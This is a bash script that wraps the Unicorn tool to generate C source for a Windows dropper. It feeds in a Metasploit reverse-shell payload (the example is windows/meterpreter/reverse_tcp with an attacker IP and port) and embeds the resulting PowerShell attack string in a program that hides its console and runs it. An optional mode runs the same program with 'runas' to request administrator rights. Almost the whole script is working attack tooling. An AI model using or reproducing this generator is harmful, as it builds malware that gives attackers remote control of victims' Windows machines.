#!/bin/bash
clear
echo '--------------------------------------'
echo ' Unicorn Powershell2C code generator  '
echo 'Works for Vista, Win7, Win8 32/64 bit'
echo '--------------------------------------'
if [ -z "$*" ];then  
echo 'Usage: unicorn2c.sh payload reverse_ipaddr port platform' 
echo 'Example: unicorn2c.sh windows/meterpreter/reverse_tcp 192.168.1.5 443 nonuac'
echo 'Valid platforms are: nonuac uac' 
exit 0 
fi
case $4 in 
nonuac)
echo 'Generating nonUAC unicorn.c ...' 
python unicorn.py $1 $2 $3  
echo '#include <stdio.h>' > unicorn.c 
echo '#include <string.h>' >> unicorn.c
echo '#include <stdlib.h>' >> unicorn.c
echo '#include <ctype.h>' >> unicorn.c 
echo '#include <aclapi.h>' >> unicorn.c 
echo '#include <shlobj.h>' >> unicorn.c 
echo '#include <windows.h>' >> unicorn.c 
echo '#pragma comment(lib, "advapi32.lib")' >> unicorn.c  
echo '#pragma comment(lib, "shell32.lib")' >> unicorn.c 
echo 'int main(int argc, char *argv[])' >> unicorn.c
echo '{' >> unicorn.c 
echo 'FreeConsole();' >> unicorn.c  
echo -n ' ShellExecute( NULL,NULL, "powershell.exe", "' >> unicorn.c
cat powershell_attack.txt | sed -r 's/^.{11}//' >> unicorn.c
echo -n '",NULL,NULL);' >> unicorn.c
echo '' >> unicorn.c 
echo 'exit(0);' >> unicorn.c
echo '}' >> unicorn.c 
todos unicorn.c 
echo '[*] Exported unicorn.c To compile use cl.exe unicorn.c'
;;

uac)
echo 'Generating UAC  unicorn.c ...'
python unicorn.py $1 $2 $3
echo '#include <stdio.h>' > unicorn.c
echo '#include <string.h>' >> unicorn.c
echo '#include <stdlib.h>' >> unicorn.c
echo '#include <ctype.h>' >> unicorn.c
echo '#include <windows.h>' >> unicorn.c
echo '#include <aclapi.h>' >> unicorn.c
echo '#include <shlobj.h>' >> unicorn.c
echo '#pragma comment(lib, "advapi32.lib")' >> unicorn.c
echo '#pragma comment(lib, "shell32.lib")' >> unicorn.c
echo 'int main(int argc, char *argv[])' >> unicorn.c
echo '{' >> unicorn.c
echo 'FreeConsole();' >> unicorn.c
echo -n ' ShellExecute( NULL, "runas", "powershell.exe", "' >> unicorn.c
cat powershell_attack.txt | sed -r 's/^.{11}//' >> unicorn.c
echo -n '",NULL,NULL);' >> unicorn.c
echo '' >> unicorn.c
echo 'exit(0);' >> unicorn.c
echo '}' >> unicorn.c
;;

"")
echo 'Usage: unicorn2c.sh payload reverse_ipaddr port platform'
echo 'Example: unicorn2c.sh windows/meterpreter/reverse_tcp 192.168.1.5 443 nonuac'
echo 'Valid platforms are: nonuac, uac' 
exit 0 
;;
esac